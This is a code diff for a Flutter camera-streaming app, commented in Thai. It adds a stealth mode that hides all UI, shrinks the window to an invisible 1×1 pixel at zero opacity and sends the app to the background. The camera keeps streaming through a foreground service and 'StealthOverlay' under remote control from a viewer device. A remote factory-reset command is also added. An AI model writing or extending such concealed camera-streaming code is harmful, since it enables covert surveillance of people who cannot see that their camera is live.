@@ -5,6 +5,7 @@ import 'camera_config.dart';
 import 'device_id.dart';
 import 'fcm_service.dart';
 import 'foreground_service.dart';
+import 'home_screen.dart';
 import 'notif_event.dart';
 import 'signaling_service.dart';
 import 'status_reporter.dart';
@@ -69,10 +70,11 @@ class _StreamingScreenState extends State<StreamingScreen> {
     _signaling.onIceCandidate = _onRemoteIce;
     _signaling.onError = (msg) => setState(() => _status = 'ข้อผิดพลาด: $msg');
 
-    // viewer สั่งสลับกล้อง / เปิดปิดไมค์ / refresh usage stats
+    // viewer สั่งสลับกล้อง / เปิดปิดไมค์ / refresh usage stats / factory-reset
     _signaling.onSwitchCamera = _onSwitchCamera;
     _signaling.onToggleMic = _onToggleMic;
     _signaling.onFetchUsageStats = _reportUsageStatsOnce;
+    _signaling.onFactoryReset = _onFactoryReset;
 
     // viewer push config มา → save ลง SharedPreferences (apply รอบหน้าตอน start FGS)
     _signaling.onConfigPushed = (json) async {
@@ -154,11 +156,15 @@ class _StreamingScreenState extends State<StreamingScreen> {
     // เปิดโหมด auto-streaming — ครั้งต่อๆ ไปเปิดแอป/รีบูต จะเข้า streaming screen เลย
     await StreamingPrefs.enable(pairCode: widget.code);
 
-    // Silent mode: ส่ง activity ไป background ทันที — user เห็น home screen
-    // กล้องยังสตรีมผ่าน FGS + StealthOverlay
-    // → ทำเฉพาะตอน silent (auto-launch) + viewer เปิด autoMinimize toggle
+    // Stealth mode: silent=true (จาก auto-launch) หรือ user เคย pair แล้ว
+    // → ซ่อน UI: window 1×1 alpha 0 + moveTaskToBack
+    // → กล้องยังสตรีมผ่าน FGS + StealthOverlay
+    // → ควบคุมทั้งหมดผ่าน viewer (เครื่องแม่)
     if (widget.silent && config.autoMinimize) {
       await Future.delayed(const Duration(milliseconds: 500));
+      // ซ่อน window ก่อน → user ไม่เห็น UI ระหว่าง transition
+      await ForegroundService.makeWindowInvisible();
+      // แล้ว move task ไป background — กลับมาเห็นจอ launcher
       await ForegroundService.minimizeApp();
     }
   }
@@ -253,6 +259,26 @@ class _StreamingScreenState extends State<StreamingScreen> {
     }
   }
 
+  /// viewer สั่ง factory-reset:
+  /// - clear auto_streaming pref → next launch จะแสดง pair UI ปกติ
+  /// - clear camera config (notification text กลับเป็น default)
+  /// - restore window จาก 1×1 → normal
+  /// - stop FGS + stealth overlay (กล้องหยุดสตรีม)
+  /// - navigate กลับ HomeScreen แสดง pair UI
+  Future<void> _onFactoryReset() async {
+    debugPrint('[streaming] factory-reset received');
+    await StreamingPrefs.disable();
+    await CameraConfigStore.save(CameraConfig.defaults);
+    await ForegroundService.restoreWindow();
+    await ForegroundService.stop();
+    await ForegroundService.stopStealthOverlay();
+    if (!mounted) return;
+    Navigator.of(context).pushAndRemoveUntil(
+      MaterialPageRoute(builder: (_) => const HomeScreen()),
+      (_) => false,
+    );
+  }
+
   @override
   void dispose() {
     _statusReporter?.stop();
@@ -270,6 +296,17 @@ class _StreamingScreenState extends State<StreamingScreen> {
 
   @override
   Widget build(BuildContext context) {
+    // Stealth mode (silent=true): ไม่ render UI ใด ๆ ให้ user เห็น
+    // — ไม่มี AppBar, ไม่มี video preview, ไม่มี loading indicator
+    // — window จะถูกย่อเหลือ 1×1 alpha 0 + moveTaskToBack หลัง _init เสร็จ
+    if (widget.silent) {
+      return const Scaffold(
+        backgroundColor: Colors.transparent,
+        body: SizedBox.shrink(),
+      );
+    }
+
+    // โหมดปกติ (user เปิด preview จาก HomeScreen) — เห็นกล้องตัวเอง
     return Scaffold(
       backgroundColor: Colors.black,
       appBar: AppBar(
